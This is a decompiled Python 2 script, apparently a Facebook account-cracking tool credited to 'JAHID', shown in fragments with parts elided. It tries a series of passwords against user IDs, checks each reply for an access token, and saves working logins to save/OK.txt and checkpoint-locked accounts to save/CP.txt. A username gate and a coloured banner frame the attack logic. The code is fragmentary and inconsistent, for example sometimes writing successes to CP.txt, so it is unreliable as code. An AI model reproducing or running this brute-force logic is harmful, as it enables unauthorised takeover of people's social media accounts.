# coding: utf-8
# Decompiled By Jahidul Islam 
# Github : https://github.com/ADRIYANADITTO543.git
# uncompyle6 version 1.1.2
# Original written By JAHIDUL ISLAM 


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
__author__ = 'JAHIDUL'
__copyright = 'All rights reserved . Copyright  JAHIDUL ISLAM'
CorrectUsername = 'JAHID'
os.system('clear')
loop = 'true'
while (loop == 'true'):
...
\033[94;1m ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   
\033[1;97m--------------------------------------------------
\033[1;91m Author      :  JAHID
\033[1;91m GitHub      : https://github.com/ADRIYANADITTO543
\033[1;91m TEAM        : N/A
\033[1;91m FACEBOOK     :  JAHIDUL ISLAM
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [JAHID_OK]  ' + k + c + user + '  ^  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m  [JAHID_CP] ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [JAHID_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [JAHID_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [JAHID_OK]  ' + k + c + user + '  ^  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [JAHID_CP] ' + k + c + user + '  ^  ' + pass3
                        cps = open('save/CP.txt', 'a')
